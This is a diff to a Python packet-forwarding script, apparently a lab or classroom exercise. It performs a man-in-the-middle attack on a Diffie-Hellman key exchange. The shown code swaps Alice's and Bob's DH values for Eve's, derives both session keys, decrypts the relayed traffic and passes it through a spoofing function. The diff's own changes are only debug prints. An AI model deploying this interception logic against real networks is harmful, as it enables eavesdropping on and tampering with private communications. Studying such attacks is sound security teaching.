@@ -126,7 +126,6 @@ def process_datagram(raw_packet, fromIf):
     # Ignore UDP
     if not isinstance(ip.data, dpkt.tcp.TCP) or not ip.p == dpkt.ip.IP_PROTO_TCP:
         subprocess.run(["LED", "R", "SOLID"])
-        print("Got UDP or something else.")
         send_datagram(eth.__bytes__(), toIf)
         return
     tcp = ip.data
@@ -134,7 +133,6 @@ def process_datagram(raw_packet, fromIf):
     #Ignore Irrelevant communications
     if tcp.sport != listenPort and tcp.dport != listenPort:
         subprocess.run(["LED", "R", "SOLID"])
-        print("Got TCP, but wrong port.")
         send_datagram(eth.__bytes__(), toIf)
         return
     
@@ -147,6 +145,8 @@ def process_datagram(raw_packet, fromIf):
         Alice = int(data.hex(), 16)
         Alice_key = create_key(Alice)
 
+        print("It's hacking time!")
+
         data_bob = format(Eve, "x").encode("utf-8")
         eth2 = swapTCPPayloadInEthernetFrame(eth, data_bob)
         send_datagram(eth2.__bytes__(), toIf)
@@ -157,6 +157,8 @@ def process_datagram(raw_packet, fromIf):
         #Diffie Hellman num is transmitted as a hex-str
         Bob = int(data.hex(), 16)
         Bob_key = create_key(Bob)
+
+        print("Let's attack alice this time.")
 
         data_alice = format(Eve, "x").encode()
         eth2 = swapTCPPayloadInEthernetFrame(eth, data_alice)
@@ -169,6 +171,11 @@ def process_datagram(raw_packet, fromIf):
 
         decrypt_key = Alice_key if sender == Alice_IP else Bob_key
         encrypt_key = Alice_key if receiver == Alice_IP else Bob_key
+
+        if decrypt_key == Alice_key:
+            print("Alice has no idea.")
+        else:
+            print("Bob is such a fool.")
 
         data = decrypt(data, decrypt_key)
         data = handle_spoofed_data(data)
